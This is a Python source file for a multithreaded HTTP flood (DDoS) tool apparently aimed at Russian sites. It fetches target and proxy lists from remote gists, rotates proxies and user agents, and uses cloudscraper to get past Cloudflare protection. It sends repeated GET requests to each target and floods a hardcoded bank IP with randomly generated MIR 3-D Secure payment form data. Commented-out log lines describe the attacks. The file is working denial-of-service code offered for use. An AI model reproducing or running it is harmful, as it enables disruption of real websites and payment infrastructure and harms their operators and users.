# -*- coding: utf-8 -*-
import json

import cloudscraper
import requests
import string
import os

from urllib.parse import unquote, urlparse
from gc import collect
from loguru import logger
import time
import sys
from sys import stderr
from threading import Thread
from random import choice
from random import randint
from random import random
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

disable_warnings()
logger.remove()
logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(sys.stdout, colorize=True, format="<green>{time}</green> <level>{message}</level>")
# logger.add(sys.stdout, colorize=True, format="<green>{time}</green> {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]} <level>{message}</level>")
# logger.add(sys.stdout, serialize=True)
threads = int(input('Кількість потоків: '))

counter_by_sites = {}

ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
ALLOVED_MD_CHARS = string.digits

BANK_IPS = ["https://185.170.2.7"]
MAX_REQUESTS = 1000


def base_scraper():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
                                                   'platform': 'android',
                                                   'mobile': True},)
    scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'})

    return scraper


def generate_MIR_data(url):
    dat = {}
    dat["PaReq"] = ''.join([choice(ALLOVED_PAREQ_CHARS) for _ in range(490)])
    dat["MD"] = ''.join([choice(ALLOVED_MD_CHARS) for _ in range(10)])
    dat["TermUrl"] = "https%3A%2F%2F" + urlparse(url).netloc
    return dat


def mainth(protocol, ip, proxy_name, region):
    # Fetching data with proxy and targets
    sites = get_sites()

    counter403 = {}

    counter_total = 0
    counter_by_sites[proxy_name] = {}

    while True:
        counter_total += 1
        if counter_total > 1000:
            sites = get_sites()
            proxies = get_proxies()
            (protocol, ip, proxy_name, region) = choice(proxies)
        scraper = base_scraper()
        # logger.info("GET RESOURCES FOR ATTACK")
        # data = choice(sites)
        if len(sites) <= 0:
            # logger.info("MOSKALI SOSUT! ATTACK WILL BE RESTARTED IN FEW MINUTES")
            sleep(300)
            counter_total = 100500
            continue
            # with open('list.txt') as f:
            #     sites = f.read().splitlines()

        index_ = randint(0, len(sites) - 1)
        current_target = sites[index_]
        if not current_target.startswith(protocol):
            sites.pop(index_)
            continue

        if region != 'all' and current_target.find(region) < 0:
            sites.pop(index_)
            continue

        if current_target not in counter_by_sites[proxy_name]:
            counter_by_sites[proxy_name][current_target] = {}

        cur_proxy = ip
        scraper.proxies.update({'http': cur_proxy,
                                'https': cur_proxy})

        # logger.info("STARTING ATTACK TO " + current_target)
        for _ in range(MAX_REQUESTS):
            response = {}
            try:
                # logger.info(json.dumps(counter_by_sites))
                if current_target in BANK_IPS:
                    response = scraper.post(current_target,
                                            generate_MIR_data(current_target))
                else:
                    response = scraper.get(current_target)
                # logger.info("ATTACKED; RESPONSE CODE: " +
                #             str(response.status_code) + " (" +
                #             (str(counter403[current_target]) if current_target in counter403 else '0') +
                #             ") TARGET: " + current_target + " PROXY: " + proxy_name +
                #             " | " + region)
                if response.status_code not in counter_by_sites[proxy_name][current_target]:
                    counter_by_sites[proxy_name][current_target][response.status_code] = 0
                counter_by_sites[proxy_name][current_target][response.status_code] += 1

                if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                    sites.pop(index_)
                    break
                if response.status_code == 403 or (500 <= int(response.status_code) < 600):
                    if current_target not in counter403:
                        counter403[current_target] = 0
                    counter403[current_target] += 1
                else:
                    if current_target in counter403 and counter403[current_target] > 0:
                        counter403[current_target] -= 1

            except Exception as err:
                # logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
                if 'exceptions' not in counter_by_sites[proxy_name][current_target]:
                    counter_by_sites[proxy_name][current_target]['exceptions'] = 0
                counter_by_sites[proxy_name][current_target]['exceptions'] += 1
                sites.pop(index_)
                break


def cleaner():
    while True:
        sleep(60)
        collect()


def get_sites():
    # with open('list.txt') as f:
    #     sites = f.read().splitlines()
    # return sites
    return loads(requests.get("https://gist.github.com/Mekhanik/3d90e637a86401bf726b489d2adeb958/raw/tg?a=" + str(random())).content)


def get_proxies():
    # return [
    #     ('http://', 'http://193.23.50.206:11335', 'mobile', 'all', ),
    #     # ('https://', 'http://193.23.50.164:10215', 'residental', '.ru', ),
    #     ('https://', 'socks5://193.23.50.164:10216', 'socks', 'all', ),
    #     # ('http://', 'http://143.110.243.165:10815', 'mobile', 'all', ),
    #     # ('https://', 'http://109.248.7.93:11108', 'residental', 'all',),
    # ]
    return loads(requests.get("https://gist.githubusercontent.com/Mekhanik/6d36aa2f722b3fd957ca5521ce0242b2/raw/px?a=" + str(random())).content)


# def pbar(window):
#     str_num = 1
#     for targets, proxy in counter_by_sites:
#         str_num += 1
#         window.addstr(y=str_num, str=proxy)
#     window.refresh()
#     time.sleep(3)


def stat_visualiser():
    while True:
        # {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]}
        logger.info(json.dumps(counter_by_sites, indent=4, sort_keys=True))
        # for proxy, targets in counter_by_sites.items():
        #     logger.info(proxy + ":", enqueue=True)
        #     for target, counters in targets.items():
        #         logger.info(target + ":")
        #         for err_code, count_ in counters.items():
        #             logger.info(str(err_code) + " => " + str(count_))

        time.sleep(3)
        os.system('clear')


if __name__ == '__main__':
    proxies = get_proxies()
    for _ in range(threads):
        Thread(target=mainth, args=choice(proxies)).start()

    Thread(target=cleaner, daemon=True).start()
    Thread(target=stat_visualiser).start()
